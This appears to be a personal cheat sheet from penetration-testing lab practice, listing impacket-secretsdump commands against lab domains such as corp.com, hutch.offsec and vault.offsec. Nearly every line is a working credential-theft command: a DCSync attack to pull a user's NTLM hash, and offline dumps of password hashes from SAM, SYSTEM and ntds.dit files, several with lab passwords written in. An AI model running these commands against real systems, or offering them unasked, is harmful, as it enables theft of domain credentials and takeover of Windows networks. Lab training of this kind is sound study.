
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@TARGET
```
dcsync attack to obtain the NTLM hash of dave

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```
secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@TARGET
```

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

```
impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET
```

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

